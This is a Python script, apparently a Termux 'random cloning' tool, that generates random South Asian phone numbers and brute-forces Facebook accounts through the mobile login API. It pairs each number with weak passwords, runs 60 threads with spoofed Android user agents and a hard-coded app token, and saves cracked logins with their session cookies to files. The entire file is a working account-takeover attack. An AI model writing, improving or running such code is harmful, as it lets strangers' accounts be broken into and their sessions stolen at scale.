#!/usr/bin/python3
#-*-coding:utf-8-*-
#!/usr/bin/python3
import os,time,random,string,re,sys,requests,json,uuid
from concurrent.futures import ThreadPoolExecutor as ThreadPool
try:os.system("pkg install espeak")
except:pass
os.system("git pull")
try:
	proxylist= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('socksku.txt','w').write(proxylist)
except Exception as e:pass
proxsi=open('socksku.txt','r').read().splitlines()
####$#######
B = '\x1b[1;90m'
R = '\x1b[1;91m'
G = '\x1b[1;92m'
H = '\x1b[1;93m'
BL = '\x1b[1;94m'
BG = '\x1b[1;95m'
S = '\x1b[1;96m'
W = '\x1b[1;97m'
EX = '\x1b[0m'
E = '\33[m'
#########
#------------------[ USER-AGENT ]-------------------#
ua2 = 'Dalvik/2.1.0 (Linux; U; Android 12; OnePlus K 36A Build/SP1A.210812.016) [FBAN/FB4A;FBAV/482.5.7.598;FBBV/23042488;FBDM/{{density=2.6,width=720,height=2560}};FBLC/en_US;FBRV/205128748;FBCR/Robi;FBMF/lge;FBBD/huawei;FBPN/com.facebook.orca;FBDV/LGE;FBSV/10;FBOP/1;FBCA/armeabi-v7a:armeabi;]','Dalvik/2.1.0 (Linux; U; Android 9; Asus Redmi 78S Build/RP1A.200720.012) [FBAN/FB4A;FBAV/316.0.3.661;FBBV/16390336;FBDM/{{density=3.7,width=720,height=2560}};FBLC/en_US;FBRV/560225026;FBCR/Banglalink;FBMF/lge;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/LGE;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]','Dalvik/2.1.0 (Linux; U; Android 7.0; Samsung M 35S Build/RP1A.200720.012) [FBAN/FB4A;FBAV/307.3.2.469;FBBV/50588441;FBDM/{{density=2.4,width=720,height=1920}};FBLC/en_US;FBRV/953798723;FBCR/WiFi;FBMF/lge;FBBD/xiaomi;FBPN/com.facebook.orca;FBDV/LGE;FBSV/11;FBOP/1;FBCA/armeabi-v7a:armeabi;]','Dalvik/2.1.0 (Linux; U; Android 12; Huawei Mate 7 Plus Build/SP1A.210812.016) [FBAN/FB4A;FBAV/458.0.7.232;FBBV/73824223;FBDM/{{density=2.5,width=1440,height=2560}};FBLC/en_US;FBRV/514942000;FBCR/Airtel;FBMF/lge;FBBD/motorola;FBPN/com.facebook.orca;FBDV/LGE;FBSV/13;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
ua = "[Dalvik/2.1.0 (Linux; U; Android 12; Lenovo C 6 Pro Build/QP1A.190711.020) [FBAN/FB4A;FBAV/302.9.3.478;FBBV/78096401;FBDM/{{density=2.6,width=1080,height=2560}};FBLC/en_US;FBRV/854341870;FBCR/Grameenphone;FBMF/lge;FBBD/lge;FBPN/com.facebook.orca;FBDV/LGE;FBSV/13;FBOP/1;FBCA/armeabi-v7a:armeabi;],]"
ua = "[Dalvik/2.1.0 (Linux; U; Android 7.0; Oppo C 1 Pro Build/QP1A.190711.020) [FBAN/FB4A;FBAV/376.1.2.865;FBBV/27786512;FBDM/{{density=1.8,width=1440,height=1280}};FBLC/en_US;FBRV/253965809;FBCR/unknown;FBMF/lge;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/LGE;FBSV/13;FBOP/1;FBCA/armeabi-v7a:armeabi;],]"
ua = "[Dalvik/2.1.0 (Linux; U; Android 12; OnePlus Poco 18A Build/RP1A.200720.012) [FBAN/FB4A;FBAV/479.9.7.129;FBBV/96398662;FBDM/{{density=2.0,width=1080,height=1280}};FBLC/en_US;FBRV/343538438;FBCR/unknown;FBMF/lge;FBBD/oneplus;FBPN/com.facebook.orca;FBDV/LGE;FBSV/13;FBOP/1;FBCA/armeabi-v7a:armeabi;],]"
ua = "[Dalvik/2.1.0 (Linux; U; Android 8.1.0; Honor Edge 11 Prime Build/RP1A.200720.012) [FBAN/FB4A;FBAV/405.7.5.247;FBBV/35499596;FBDM/{{density=1.8,width=1080,height=1280}};FBLC/en_US;FBRV/130293601;FBCR/Airtel;FBMF/lge;FBBD/huawei;FBPN/com.facebook.orca;FBDV/LGE;FBSV/13;FBOP/1;FBCA/armeabi-v7a:armeabi;],]"
ua = "[Dalvik/2.1.0 (Linux; U; Android 9; Samsung M 21 Build/RP1A.200720.012) [FBAN/FB4A;FBAV/369.3.2.775;FBBV/34648853;FBDM/{{density=1.9,width=1080,height=1920}};FBLC/en_US;FBRV/863203227;FBCR/Airtel;FBMF/lge;FBBD/motorola;FBPN/com.facebook.katana;FBDV/LGE;FBSV/13;FBOP/1;FBCA/armeabi-v7a:armeabi;],]"
ua = "[Dalvik/2.1.0 (Linux; U; Android 9; Tecno Hot 30 Max Build/SP1A.210812.016) [FBAN/FB4A;FBAV/387.6.9.132;FBBV/87011411;FBDM/{{density=3.2,width=720,height=1280}};FBLC/en_US;FBRV/615592555;FBCR/Robi;FBMF/lge;FBBD/samsung;FBPN/com.facebook.katana;FBDV/LGE;FBSV/10;FBOP/1;FBCA/armeabi-v7a:armeabi;],]"
ua = "[Dalvik/2.1.0 (Linux; U; Android 10; Xiaomi F 50 Plus Build/RP1A.200720.012) [FBAN/FB4A;FBAV/412.5.9.220;FBBV/74164276;FBDM/{{density=2.8,width=720,height=1920}};FBLC/en_US;FBRV/880851473;FBCR/Grameenphone;FBMF/lge;FBBD/huawei;FBPN/com.facebook.katana;FBDV/LGE;FBSV/10;FBOP/1;FBCA/armeabi-v7a:armeabi;],]"
ua = "[Dalvik/2.1.0 (Linux; U; Android 7.0; Meizu A 24A Build/QP1A.190711.020) [FBAN/FB4A;FBAV/351.0.7.352;FBBV/82560267;FBDM/{{density=2.9,width=1440,height=1280}};FBLC/en_US;FBRV/556994482;FBCR/Teletalk;FBMF/lge;FBBD/huawei;FBPN/com.facebook.orca;FBDV/LGE;FBSV/11;FBOP/1;FBCA/armeabi-v7a:armeabi;],]"
ua = "[Dalvik/2.1.0 (Linux; U; Android 10; Huawei K 6 Pro Build/RP1A.200720.012) [FBAN/FB4A;FBAV/484.0.1.748;FBBV/68771965;FBDM/{{density=2.0,width=720,height=1280}};FBLC/en_US;FBRV/201481901;FBCR/Robi;FBMF/lge;FBBD/lge;FBPN/com.facebook.katana;FBDV/LGE;FBSV/11;FBOP/1;FBCA/armeabi-v7a:armeabi;],]"
ua = "[Dalvik/2.1.0 (Linux; U; Android 7.0; Lenovo Poco 26S Build/SP1A.210812.016) [FBAN/FB4A;FBAV/455.6.2.563;FBBV/93136868;FBDM/{{density=1.3,width=1440,height=1920}};FBLC/en_US;FBRV/320073834;FBCR/WiFi;FBMF/lge;FBBD/motorola;FBPN/com.facebook.katana;FBDV/LGE;FBSV/13;FBOP/1;FBCA/armeabi-v7a:armeabi;],]"
ua = "[Dalvik/2.1.0 (Linux; U; Android 10; ZTE C 67 Prime Build/QP1A.190711.020) [FBAN/FB4A;FBAV/350.5.4.274;FBBV/18434379;FBDM/{{density=1.4,width=1080,height=1280}};FBLC/en_US;FBRV/681614504;FBCR/Banglalink;FBMF/lge;FBBD/huawei;FBPN/com.facebook.katana;FBDV/LGE;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;],]"
ua = "[Dalvik/2.1.0 (Linux; U; Android 11; Meizu Poco 31A Build/RP1A.200720.012) [FBAN/FB4A;FBAV/324.2.3.737;FBBV/22509442;FBDM/{{density=3.5,width=1440,height=1280}};FBLC/en_US;FBRV/250758635;FBCR/WiFi;FBMF/lge;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/LGE;FBSV/10;FBOP/1;FBCA/armeabi-v7a:armeabi;],]"
ugen=[]
ugtn=[]
ugxn=[] 
xxxxx=("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')
###########--[ RANDOM]--#############
#######$$
dt="•"
#########
id
ok=[]
cp=[]
twf=[]
lop=0
xode=[]
plist=[]
cpx=[]
cokix=[]
apkx=[]
paswtrh = []
rcd=[]
rcdx=[]
version="1.07"
def line():
	print(40*"=")
############------[ RANDOM SYS ]------#########
BDX=f"{W}BD SIM CODE : {G}017 015 018 019 013 016{E}{W}"
INDX=f"{W}IND SIM CODE : {G}9670 9725 8948 8795 6383{E}{W}"
PAKX=f"{W}PAK SIM CODE : {G}0306 0315 0335 0345 0318{E}{W}"
LIMITX=f"EXAMPLE : {G}1000{W},{G}5000{W},{G}10000{W},{G}15000{W},{G}20000{W}"
############------[ A SYS ]------#########
CPG=f"[{G}+{W}] Do you went show cp account (y/n)"
CKIG=f"[{G}+{W}] Do you went show cookie (y/n)"
chc=f'{W}[{G}+{E}] Choice : {G}'
flp=f"{W}[{G}•{W}] PUT FILE PATH\033[1;37m : {G}"
chcps=f'EXAMPLE: {G}first123{W},{G}last123{W},{G}firstlast{W},{G}name{W}'
mxxt=f'{W}[{G}A{W}] METHOD [{G}1{W}]\n{W}[{G}B{W}] METHOD [{G}2{W}]\n{W}[{G}C{W}] METHOD [{G}3{W}]'
nflp=f"[{R}!{W}] FILE LOCATION NOT FOUND "
############------[ LOGO ]------#########
os.system("xdg-open https://t.me/BANGLADESH_ISLAMIC_CYBER_TEAM")
os.system('espeak -a 300 "well,come to, RIDOY,X,X, tools"')
def logo():
	os.system('clear');print(f""" 
\x1b[1;92m▶𝗔𝗥
\033[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
\033[34;1m┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴
\033[34;1m┴┬┴┬\033[38;5;46m░▀▀█\x1b[38;5;196m▶︎RIDOY\033[38;5;46m░█▀█\x1b[38;5;196m▶RIDOY\033[38;5;46m︎░█░█\x1b[38;5;196m▶︎RIDOY\033[38;5;46m░█▀▀\x1b[38;5;196m▶RIDOY︎\033[38;5;46m░█▀▄\033[34;1m┴┬┴┬
\033[34;1m┬┴┬┴\033[38;5;46m░░░█\x1b[38;5;196m▶RIDOY\033[38;5;46m︎░█░█\x1b[38;5;196m▶︎RIDOY\033[38;5;46m░█▀▄\x1b[38;5;196m▶︎RIDOY\033[38;5;46m░█▀▀\x1b[38;5;196m▶︎RIDOY\033[38;5;46m░█▀▄\033[34;1m┬┴┬┴
\033[34;1m┴┬┴┬\033[38;5;46m░▀▀░\x1b[38;5;196m▶︎RIDOY\033[38;5;46m░▀▀▀\x1b[38;5;196m▶︎RIDOY\033[38;5;46m░▀░▀\x1b[38;5;196m▶︎RIDOY\033[38;5;46m░▀▀▀\x1b[38;5;196m▶RIDOY︎\033[38;5;46m░▀░▀\033[34;1m┴┬┴┬
\033[34;1m┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴    
\033[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛   
\x1b[1;96m▶︎WINNERS FOCUS ON WINNING, LOSERS FOCUS ON WINNERS◀︎
\033[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━             
\033[1;35m  AUTHOR    : \033[38;5;46m𝗥I𝗗𝗢𝗬 𝘅 𝗝𝗢𝗞𝗘𝗥
\033[1;35m  TOOL NAME : \033[38;5;46mRANDOM CLONING
\033[1;35m  TOOL TYPE : \033[38;5;46mFREE
\033[1;35m  VERSION   : \033[1;34m0.1 
\033[1;35m  STATUS    : \033[1;34m𝗪I𝗙I + 𝗗𝗔𝗧𝗔
\x1b[1;96m╔══════━━━━━━━━━━━━━━━━━━━━━━━━━━━━══════╗
\x1b[1;37mAFTER EVERY 5 MINUTE  ON/OFF AIRPLANE MODE
\x1b[1;96m╔══════━━━━━━━━━━━━━━━━━━━━━━━━━━━━══════╝
\x1b[1;36m○●○●○●○● 𝗡 𝗘 𝗩 𝗘 𝗥  𝗚 𝗜 𝗩 𝗘  𝗨 𝗣 ○●○●○●○●
\x1b[1;96m╚══════━━━━━━━━━━━━━━━━━━━━━━━━━━━━══════╝""")
############------[ RANDOM NUM ]------#########
def Main():
	logo()
	print(f' {W}[{G}A{W}]{W} RANDOM CRACK [{G}BANGLADESH{W}]');print(f' {W}[{G}B{W}]{W} RANDOM CRACK [{G}PAKISTAN{W}]');print(f' {W}[{G}C{W}]{W} RANDOM CRACK [{G}INDIA{W}]')
	line()
	ghx=input(f' [{G}+{W}] Choice : {G}')
	if ghx in ["A","a","1"]:rcd.append(f'1');rmenu1()
	elif ghx in ["B","b","2"]:rcd.append(f'2');rmenu1()
	elif ghx in ["C","c","3"]:rcd.append(f'3');rmenu1()
	else:line();print(f'\n \t {R}Choose valid option{E}');time.sleep(1);Main()
############------[RANDOM NUMBER SYSTEM]------#########
def rmenu1():
	logo()
	if "1" in rcd:print(f"{BDX}");line()
	if "2" in rcd:print(f"{PAKX}");line()
	if "3" in rcd:print(f"{INDX}");line()
	code=input(f'{chc}');print(f"{W}{40*'='}")
	print(f'{LIMITX}');line()
	limit=int(input(f'[{G}+{E}] Limit : {G}'))
	print(f"{W}{40*'='}");print(f'{CPG}');line()
	cx=input(f'[{chc}')
	if cx in ['n','N','no','NO','2']:cpx.append(f'n')
	else:cpx.append(f'y')
	print(f"{W}{40*'='}");print(f'{CKIG}');line()
	ckiv=input(f'{chc}')
	if ckiv in ['n','N','no','NO','2']:cokix.append(f'n')
	else:cokix.append(f'y')
	for number in range(limit):
		if "1" in rcd:numberx = ''.join(random.choice(string.digits) for _ in range(8));xode.append(numberx)
		if "2" in rcd:numberx = ''.join(random.choice(string.digits) for _ in range(7));xode.append(numberx)
		if "3" in rcd:numberx = ''.join(random.choice(string.digits) for _ in range(6));xode.append(numberx)
	with ThreadPool(max_workers=60) as tonxoys:
		tid= str(len(xode))
		logo();print(f' [{G}•{W}] TOTAL ID :\033[1;92m '+tid);print (f' {W}[{G}•{W}] \033[1;97mSIM CODE : \033[1;92m'+code);print(f' {W}[{G}•{W}] \033[1;37mTHE PROCESS HAS BEEN STARTED');print(f' [{G}•{W}] \033[1;37mUSE AEROPLANE MODE IN EVERY 5 MIN ');print(40*"=")
		for rngx in xode:
			id=code+rngx
			if "1" in rcd:psd=[id,rngx,id[:6],id[:7],id[:8],id[5:]]
			if "2" in rcd:psd=[id,rngx,id[5:],"Pakistan","password"]
			if "3" in rcd:psd=[id,rngx,id[:6],"57273200","59039200","57575752","57575751"]
			tonxoys.submit(graphrm,id,psd,tid)
			
############------[RANDOM USN SYSTEM]-------########


lk=[]
def graphrm(id,psd,tid):
	global ok,cp,lk,lop
	togg=[]
	sys.stdout.write(f'\r\r{BG}[{W}ARFAN-M2{BG}]{G}{E}{BG}[{G}{lop}{W}/{G}{tid}{BG}]{E}{BG}[{W}OK{W}:{G}%s{W}/{S}%s{BG}]{E}'%(len(ok),len(lk)));sys.stdout.flush()
	for psw in psd:
		#ua=ua1()
		vchrome = str(random.randint(100,925))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150));VAPP = random.randint(410000000,499999999);gtt=random.choice(xxxxx);gttt=random.choice(xxxxx)
		ua = "[Dalvik/2.1.0 (Linux; U; Android 10; Samsung K 66S Build/SP1A.210812.016) [FBAN/FB4A;FBAV/304.3.4.731;FBBV/54723737;FBDM/{{density=3.2,width=1440,height=1280}};FBLC/en_US;FBRV/511094051;FBCR/WiFi;FBMF/lge;FBBD/oneplus;FBPN/com.facebook.orca;FBDV/LGE;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;],]"
		datax= {'adid': str(uuid.uuid4()),'format': 'json','device_id': str(uuid.uuid4()),'email': id,'password': psw,'generate_analytics_claims': '1', 'community_id': '','cpl': 'true','try_num': '1','family_device_id': str(uuid.uuid4()),'credentials_type': 'password','source': 'login','error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false','generate_session_cookies': '1','generate_machine_id': '1','currently_logged_in_userid': '0','locale': 'en_GB','client_country_code': 'GB', 'fb_api_req_friendly_name': 'authenticate'}
		header={'User-Agent': ua,'Accept-Encoding':  'gzip, deflate','Accept': '*/*', 'Connection': 'keep-alive','Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Friendly-Name': 'authenticate','X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),'X-FB-Net-HNI': str(random.randint(20000, 40000)),'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'X-FB-Connection-Type': 'unknown','Content-Type': 'application/x-www-form-urlencoded','X-FB-HTTP-Engine': 'Liger'}
		twfx= 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
		lo=requests.post('https://'+'b-gr'+'ap'+'h'+'.facebook.com/auth/login',data=datax,headers=header,allow_redirects=False).json()
		if 'session_key' in lo:
			cki = lo["session_cookies"]
			ck={}
			for xk in cki:ck.update({xk["name"]:xk["value"]})
			coki = (";").join([ "%s=%s" % (key, value) for key, value in ck.items() ])
			iid= re.findall('c_user=(.*);xs', coki)[0]
			print(f'\r\r{G}[ARFAN-OK] {iid} | {psw}{W}');os.system('espeak -a 300 "ok id"');ok.append(id);open('/sdcard/ARFAN-OK.txt', 'a').write(iid+' | '+psw+' | '+id+'  ------------>>>'+coki+"\n")
			if 'y' in cokix:print(f'\r\r{R}[{G}COOKIES🍪{R}]{W} : {G}{coki}{E}');print(f"{W}{40*'-'}{E}")
			break
		elif twfx in str(lo):
			iid = lo['error']['error_data']['uid']
			print(f'\r\r{BL}[ARFAN-2F] {iid} | {psw}{W}');os.system('espeak -a 300 "two,f id"');open('/sdcard/ARFAN-2F.txt', 'a').write(iid+' | '+psw+' | '+id+"\n")
			twf.append(id)
			break
		elif 'www.facebook.com' in lo['error']['message']:
			try:
				iid = lo['error']['error_data']['uid']
			except:
				iid=id
			if iid in ok:pass
			else:
				if 'y' in cpx:
					print(f'\r\r{R}[ARFAN-CP] {iid} | {psw}{W}');cp.append(id);os.system('espeak -a 300 "cp id"');open('/sdcard/ARFAN-CP.txt', 'a').write(iid+' | '+psw+' | '+id+"\n")
			break
		else:continue
	lop+=1
Main()
